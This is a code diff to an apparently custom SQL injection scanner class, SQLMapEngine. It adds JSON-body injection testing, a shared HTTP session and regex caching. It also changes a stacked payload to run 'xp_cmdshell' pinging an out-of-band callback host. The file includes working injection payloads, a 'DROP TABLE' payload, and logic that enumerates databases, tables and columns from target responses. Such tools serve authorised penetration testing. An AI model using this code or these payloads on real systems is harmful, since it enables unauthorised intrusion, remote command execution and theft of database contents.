@@ -27,6 +27,9 @@ import threading
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
+from core.shared_infra import shared_session, regex_cache, PayloadInjector, oob_provider
+from core.var import USER_AGENTS
+
 # ============================================================================
 # ANSI COLOR CODES
 # ============================================================================
@@ -232,7 +235,7 @@ STACKED_PAYLOADS = [
     "'; SELECT 1-- -",
     "'; SELECT SLEEP(1)-- -",
     "'; WAITFOR DELAY '0:0:1'-- -",
-    "'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -",
+    "'; EXEC master..xp_cmdshell 'ping {oob_host}'-- -",
     "'; SELECT pg_sleep(1)-- -",
     "1; SELECT 1-- -",
     "1; DROP TABLE test_zylon-- -",
@@ -366,13 +369,7 @@ class SQLMapEngine:
 
     def __init__(self, session=None, timeout=10, retries=3, threads=5,
                  delay=0, verbose=True, tamper=None, proxy=None):
-        self.session = session or requests.Session()
-        self.session.verify = False
-        self.session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-        })
-        if proxy:
-            self.session.proxies = {'http': proxy, 'https': proxy}
+        self.session = session or shared_session
         self.timeout = timeout
         self.retries = retries
         self.threads = threads
@@ -412,7 +409,7 @@ class SQLMapEngine:
         return payload
 
     def _send_request(self, url, param, payload, method='GET', data=None,
-                      cookie=None, header=None, user_agent_inject=None):
+                      cookie=None, header=None, user_agent_inject=None, json_inject=False):
         """Send HTTP request with SQLi payload injected"""
         try:
             tampered = self._apply_tamper(payload)
@@ -427,6 +424,27 @@ class SQLMapEngine:
                 headers = {header: tampered}
             elif user_agent_inject:
                 headers = {'User-Agent': tampered}
+            elif json_inject:
+                # JSON body injection via PayloadInjector
+                injection = PayloadInjector.inject_json(url, param, tampered, method=method)
+                headers.update(injection.get('headers', {}))
+                for attempt in range(self.retries):
+                    try:
+                        resp = self.session.request(injection['method'], injection['url'],
+                                                    json=injection['json'], headers=headers,
+                                                    cookies=cookies, timeout=self.timeout,
+                                                    allow_redirects=True)
+                        if self.delay > 0:
+                            time.sleep(self.delay)
+                        return resp
+                    except requests.exceptions.Timeout:
+                        self._log(f"Timeout (attempt {attempt+1}/{self.retries})", "warning")
+                        continue
+                    except requests.exceptions.ConnectionError:
+                        self._log(f"Connection error (attempt {attempt+1}/{self.retries})", "warning")
+                        time.sleep(1)
+                        continue
+                return None
             elif method.upper() == 'POST':
                 req_data[param] = tampered
             else:
@@ -475,7 +493,7 @@ class SQLMapEngine:
             return False, None
         text = response.text
         for pattern in SQLI_ERROR_SIGNATURES:
-            match = re.search(pattern, text, re.IGNORECASE)
+            match = regex_cache.search(pattern, text, re.IGNORECASE)
             if match:
                 return True, match.group(0)
         return False, None
@@ -603,6 +621,18 @@ class SQLMapEngine:
             results['findings'].extend(inline_payloads)
             self._log("Inline query SQLi detected!", "success")
 
+        # 7. JSON body injection (test if only GET/POST form was used)
+        if method.upper() in ('GET', 'POST'):
+            self._log("Testing JSON body injection SQLi...", "info")
+            json_vuln, json_payloads = self._test_json_injection(url, param, method)
+            technique_results['json_inject'] = json_vuln
+            results['techniques_tested'].append('json_inject')
+            if json_vuln:
+                results['techniques_vulnerable'].append('json_inject')
+                results['vulnerable'] = True
+                results['findings'].extend(json_payloads)
+                self._log("JSON body injection SQLi detected!", "success")
+
         results['details']['technique_results'] = technique_results
         results['details']['waf_detected'] = self.waf_type
 
@@ -726,7 +756,14 @@ class SQLMapEngine:
         vulnerable = False
         findings = []
 
-        for payload in STACKED_PAYLOADS:
+        # Generate OOB callback host for payloads that reference {oob_host}
+        oob_host = oob_provider.get_callback_domain(oob_provider.generate_payload_id())
+
+        for payload_template in STACKED_PAYLOADS:
+            try:
+                payload = payload_template.format(oob_host=oob_host)
+            except (KeyError, IndexError):
+                payload = payload_template
             start = time.time()
             resp = self._send_request(url, param, payload, method=method)
             elapsed = time.time() - start
@@ -781,11 +818,45 @@ class SQLMapEngine:
                     break
         return vulnerable, findings
 
+    def _test_json_injection(self, url, param, method='POST'):
+        """Test for SQLi via JSON body injection using PayloadInjector"""
+        vulnerable = False
+        findings = []
+        for payload in ERROR_BASED_PAYLOADS[:5]:
+            resp = self._send_request(url, param, payload, method=method, json_inject=True)
+            if resp:
+                is_sqli, error_msg = self._check_error_based(resp)
+                if is_sqli:
+                    vulnerable = True
+                    findings.append({
+                        'technique': 'json_inject',
+                        'payload': payload,
+                        'evidence': error_msg[:100],
+                        'param': param,
+                    })
+                    self._fingerprint_from_error(error_msg)
+                    break
+        if not vulnerable:
+            for payload in BOOLEAN_BLIND_PAYLOADS["true_conditions"][:3]:
+                true_resp = self._send_request(url, param, payload, method=method, json_inject=True)
+                false_resp = self._send_request(url, param,
+                    BOOLEAN_BLIND_PAYLOADS["false_conditions"][0], method=method, json_inject=True)
+                if self._check_boolean_blind(true_resp, false_resp):
+                    vulnerable = True
+                    findings.append({
+                        'technique': 'json_inject',
+                        'payload': payload,
+                        'evidence': f"Boolean blind via JSON: True={len(true_resp.text) if true_resp else 0}B / False={len(false_resp.text) if false_resp else 0}B",
+                        'param': param,
+                    })
+                    break
+        return vulnerable, findings
+
     def _fingerprint_from_error(self, error_msg):
         """Identify database type from error message"""
         for db_name, db_info in DB_FINGERPRINTS.items():
             for pattern in db_info["error_patterns"]:
-                if re.search(pattern, error_msg, re.IGNORECASE):
+                if regex_cache.search(pattern, error_msg, re.IGNORECASE):
                     self.db_type = db_name
                     self._log(f"Database identified: {db_name}", "success")
                     return
@@ -833,7 +904,7 @@ class SQLMapEngine:
             version_payload = db_info['version_query']
             resp = self._send_request(url, param, version_payload, method='GET')
             if resp:
-                version_match = re.search(db_info['version_pattern'], resp.text, re.IGNORECASE)
+                version_match = regex_cache.search(db_info['version_pattern'], resp.text, re.IGNORECASE)
                 if version_match:
                     results['details']['db_type'] = db_name
                     results['details']['db_version'] = version_match.group(1)
@@ -932,7 +1003,7 @@ class SQLMapEngine:
         if resp and len(resp.text) != self._original_length:
             # Parse out database names (heuristic - look for new content)
             new_content = resp.text.replace(self._original_response, "")
-            potential_dbs = re.findall(r'[a-zA-Z_][a-zA-Z0-9_]{2,30}', new_content)
+            potential_dbs = regex_cache.findall(r'[a-zA-Z_][a-zA-Z0-9_]{2,30}', new_content)
             # Filter common DB names
             common_dbs = ['information_schema', 'mysql', 'performance_schema',
                          'sys', 'public', 'pg_catalog', 'master', 'tempdb',
@@ -961,7 +1032,7 @@ class SQLMapEngine:
         resp = self._send_request(url, param, table_query, method='GET')
         if resp and len(resp.text) != self._original_length:
             new_content = resp.text.replace(self._original_response, "")
-            potential_tables = re.findall(r'[a-zA-Z_][a-zA-Z0-9_]{2,40}', new_content)
+            potential_tables = regex_cache.findall(r'[a-zA-Z_][a-zA-Z0-9_]{2,40}', new_content)
             found_tables = list(set(potential_tables))[:30]
             if found_tables:
                 results['details']['tables']['current_db'] = found_tables
@@ -991,7 +1062,7 @@ class SQLMapEngine:
             resp = self._send_request(url, param, col_query, method='GET')
             if resp and len(resp.text) != self._original_length:
                 new_content = resp.text.replace(self._original_response, "")
-                potential_cols = re.findall(r'[a-zA-Z_][a-zA-Z0-9_]{2,30}', new_content)
+                potential_cols = regex_cache.findall(r'[a-zA-Z_][a-zA-Z0-9_]{2,30}', new_content)
                 found_cols = list(set(potential_cols))[:20]
                 if found_cols:
                     results['details']['columns'][table] = found_cols
